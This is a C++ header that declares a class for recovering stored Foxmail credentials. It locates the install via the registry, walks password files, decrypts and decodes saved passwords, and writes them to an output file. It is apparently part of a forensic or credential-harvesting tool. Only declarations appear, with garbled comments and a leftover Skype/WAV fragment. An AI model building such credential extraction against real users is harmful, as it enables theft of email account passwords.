#pragma once

class CEvidenceFoxMail
{
public:
	CEvidenceFoxMail(void);
	~CEvidenceFoxMail(void);

	BOOL SetOutputDir(LPCTSTR strOutPath);
	BOOL IsFoxInstall();
	BOOL StartWork();



private:
	BOOL GetPathInReg();		//ע�����Ѱ��foxmail�İ�װ·��
	BOOL RecursePassFile(LPSTR lpPath);	
	BOOL WritePassToFile(LPSTR lpFileName, LPSTR lpBuffer);

	BOOL DecodeFoxmailPassword(
		/*IN*/  char* szEncPwd,     /*max len = 34, not include the '\0'*/
		/*OUT*/ char* szDecPwd      /*max len = 16, not include the '\0'*/
		);
	BOOL GetAccountInfo(LPSTR lpFileName, LPSTR lpUser, LPSTR lpPassEnc);
	BOOL DecryptPassFile(LPSTR lpFileName, LPSTR lpOutBuf);
	BOOL MatchString(LPSTR lpSrc, LPSTR lpMatch, LPSTR lpOut);

private:
	typedef struct  
	{
		char szRiff[4];
		int nSizeFile;
		char szWave[4];
		char szfmt[4];
		int nSizeFormate;
		GSM610WAVEFORMAT pfm;
		char szData[4];
		int nSizeWave;
	}WAVEFILE_HEADER, *PMOVEFILE_HEADER;

	char m_szAppPath[MAX_PATH];		//skype�İ�װĿ¼
	char m_szOutPath[MAX_PATH];		//����ļ�Ŀ¼	
	char m_szOutFileName[MAX_PATH];	//����ļ���
};
